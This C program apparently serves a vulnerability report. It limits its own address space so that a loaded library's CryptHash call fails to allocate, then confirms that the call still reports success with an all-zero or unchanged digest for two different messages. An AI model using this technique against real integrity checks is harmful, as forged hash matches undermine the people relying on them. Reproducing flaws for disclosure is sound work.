/* Reproduce resource-contingent false-success hash results on Linux. */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <unistd.h>

typedef int (*hash_fn)(int, const unsigned char *, unsigned long long,
                       unsigned char *);

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "usage: %s LIB {axis|feilian|taichi} REPORT_ID\n", argv[0]);
        return 2;
    }
    const char *kind = argv[2];
    int axis = !strcmp(kind, "axis");
    int taichi = !strcmp(kind, "taichi");
    if (!axis && !taichi && strcmp(kind, "feilian")) return 2;

    void *lib = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
    if (!lib) { fprintf(stderr, "%s\n", dlerror()); return 2; }
    hash_fn hash = (hash_fn)dlsym(lib, "CryptHash");
    if (!hash) { fprintf(stderr, "CryptHash not exported\n"); return 2; }

    unsigned char short_a[64], short_b[64];
    const unsigned char msg_a[] = {0}, msg_b[] = {0x58};
    if (hash(512, msg_a, 8, short_a) || hash(512, msg_b, 8, short_b)
        || !memcmp(short_a, short_b, sizeof short_a)) {
        fprintf(stderr, "normal-memory changed-message control failed\n");
        return 1;
    }

    const size_t msg_bytes = 16u * 1024u * 1024u;
    unsigned char *message = malloc(msg_bytes);
    if (!message) return 2;
    memset(message, 0, msg_bytes);

    FILE *statm = fopen("/proc/self/statm", "r");
    unsigned long pages = 0;
    if (!statm || fscanf(statm, "%lu", &pages) != 1) return 2;
    fclose(statm);
    struct rlimit limit;
    if (getrlimit(RLIMIT_AS, &limit)) return 2;
    const rlim_t cap = (rlim_t)pages * (rlim_t)sysconf(_SC_PAGESIZE)
                       + 4u * 1024u * 1024u;
    if (limit.rlim_max != RLIM_INFINITY && cap > limit.rlim_max) return 2;
    limit.rlim_cur = cap;
    if (setrlimit(RLIMIT_AS, &limit)) return 2;

    unsigned char out_a[64], out_b[64];
    memset(out_a, 0xa5, sizeof out_a);
    memset(out_b, 0xa5, sizeof out_b);
    const unsigned long long bits = (unsigned long long)msg_bytes * 8u - axis;
    alarm(15); /* If allocation unexpectedly succeeds, bound this large test. */
    int rc_a = hash(512, message, bits, out_a);
    message[0] = 0x58;
    int rc_b = hash(512, message, bits, out_b);
    alarm(0);

    unsigned char expected[64];
    memset(expected, taichi ? 0xa5 : 0, sizeof expected);
    if (rc_a || rc_b || memcmp(out_a, expected, sizeof expected)
        || memcmp(out_b, expected, sizeof expected)) {
        fprintf(stderr, "allocation-failure result did not match expected mode\n");
        return 1;
    }
    printf("ATTACK %s %s CONFIRMED rc=0 digest=%s "
           "message_bytes=%zu address_space_cap=%llu\n",
           argv[3], kind, taichi ? "untouched" : "all-zero", msg_bytes,
           (unsigned long long)cap);
    free(message);
    dlclose(lib);
    return 0;
}
